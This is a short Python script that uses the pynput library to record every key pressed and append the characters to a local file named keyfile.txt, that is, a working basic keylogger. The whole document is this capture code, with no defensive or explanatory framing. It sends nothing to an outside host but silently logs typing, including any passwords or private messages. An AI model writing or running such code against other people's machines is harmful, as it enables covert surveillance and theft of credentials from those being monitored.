def keyPressed(key):     # Defining key Pressed function
    print(str(key))
    with open("keyfile.txt",'a') as logkey :

        try:
            char = key.char
            logkey.write(char)
        except:
            print("ERROR. Unable to retrieve char!")





from pynput import keyboard
if __name__ =="__main__":
    listener = keyboard.Listener(on_press =keyPressed)
    listener.start()
    input()
    
